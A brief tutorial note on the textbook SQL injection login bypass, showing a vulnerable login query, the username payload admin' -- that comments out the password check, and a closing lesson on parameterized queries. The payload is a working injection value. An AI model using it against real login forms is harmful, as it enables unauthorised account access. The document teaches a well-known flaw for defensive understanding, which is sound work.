# The textbook SQL-comment auth bypass

The simplest SQLi pattern there is. Backend probably executes:

```sql
SELECT * FROM users WHERE username = '<user>' AND password = '<password>';
```

Submit username `admin' --` and any password. The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

The `--` comments out the rest. Only the username is checked. If `admin` exists, you're in.

## Lesson

Any place strings are interpolated into SQL without parameterization is exploitable. This particular bypass is older than most of the code that's still vulnerable to it.
